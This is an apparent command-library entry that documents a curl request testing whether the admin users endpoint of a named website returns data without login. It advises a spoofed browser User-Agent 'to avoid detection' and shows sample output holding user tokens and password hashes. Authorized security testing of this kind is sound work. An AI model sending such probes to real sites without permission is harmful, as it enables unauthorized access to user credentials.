---
data: >-
  curl -X GET https://ubernihao.com/admin/users -H "User-Agent: Mozilla/5.0
  (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -v
tags:
  - web-testing
  - information-disclosure
type: command
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
id: 64f3f285-d4ff-48f3-90b3-8f834bcf5274
created_at: '2025-12-14T17:29:20.306Z'
updated_at: '2025-12-14T17:29:20.306Z'
verified: false
validated: true
submitted: true
---
# curl-unauthorized-admin-access

## Command

```bash
curl -X GET https://ubernihao.com/admin/users -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -v
```

## Description

This command tests for missing authorization by sending an unauthenticated GET request to an admin endpoint on ubernihao.com. It uses a standard browser User-Agent to mimic legitimate traffic and verbose mode (-v) to show headers and status codes. Use it to check if sensitive admin data is exposed without login.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| `https://ubernihao.com/admin/users` | Target endpoint URL (adjust path as needed) | Yes |
| `-H "User-Agent: ..."` | Sets a browser-like User-Agent to avoid detection | No |
| `-v` | Enables verbose output for debugging | No |

## Examples

### Basic Usage

```bash
curl -X GET https://ubernihao.com/admin/users
```

### Advanced Usage

```bash
curl -X GET https://ubernihao.com/admin/users -H "User-Agent: Mozilla/5.0" -H "Accept: application/json" -o response.json -v
```

This saves the output to a file and requests JSON format.

## Expected Output

On success (missing auth), expect HTTP 200 with body containing admin data, e.g.:

```
< HTTP/1.1 200 OK
< Content-Type: application/json
{
  "users": [
    {"username": "admin", "token": "eyJ...", "password": "hashedpass"}
  ]
}
```

Failure (proper auth) shows 401/403 with error message.

## Related

- [[Related Procedure: Exploit-Missing-Authorization-for-Admin-Data-Disclosure]]
